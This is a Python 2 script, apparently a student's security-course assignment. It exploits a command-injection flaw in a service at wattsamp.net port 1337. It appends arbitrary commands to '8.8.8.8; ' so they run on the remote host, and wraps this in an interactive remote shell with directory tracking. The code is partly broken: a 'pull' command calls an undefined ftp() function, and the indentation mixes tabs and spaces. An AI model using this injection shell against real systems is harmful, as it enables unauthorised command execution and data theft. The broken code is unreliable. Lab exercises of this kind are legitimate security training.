"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import time

host = "wattsamp.net" # IP address here
port = 1337 # Port here

def execute_cmd(cmd):
	"""
        Sockets: https://docs.python.org/3/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
        
            Reading:
        
                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data
        
            Sending:
        
                s.send("something to send\n")   # Send a newline \n at the end of your command
	 """
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))

        s.recv(1024)

        s.send("8.8.8.8; " + cmd + '\n')

        data = s.recv(1024).split('\n')
        print('\n'.join(data[7:]))


def shell():
	directory = []
	user_input = raw_input("/" + '/'.join(directory) + "> ").strip()
	while user_input.lower() != "exit":
		if user_input != "":
			data = user_input.split()
			if data[0] == "cd":
                                if len(data) == 1:
                                        directory = []
                                elif len(data) == 2:
                                        if data[1][0] == "/":
                                                directory = [direc for direc in data[1].split('/') if direc != '']
                                        else:
                                                for direc in data[1].split('/'):
                                                        if direc == '' or direc == ".":
                                                                continue
                                                        elif direc == "..":
                                                                directory.pop()
                                                        else:
                                                                directory.append(direc)
                                else:
                                        print("Invalid cd input.")
                        else:
                                cmd = "cd /" + '/'.join(directory) + "; " + user_input
                                execute_cmd(cmd)
                user_input = raw_input("/" + '/'.join(directory) + "> ").strip()
                                
def help():
	print("Interactive shell help menu")
	print("Available commands:")
	print("    shell - drop into an interactive shell. Exit with 'exit'")
	print("    pull <remove-path> <local-path> - download files")
	print("    help - show this menu")
	print("    quit - quit this shell")

def repl():
	user_input = raw_input("> ").strip()
	while user_input.lower() != "quit":
		if user_input != "":
			data = user_input.split()
			if data[0].lower() == "shell":
				shell()
			elif data[0].lower() == "pull" and len(data) == 3:
				ftp(data[1], data[2])
			else:
				help()
		user_input = raw_input("> ").strip()

if __name__ == '__main__':
    repl()
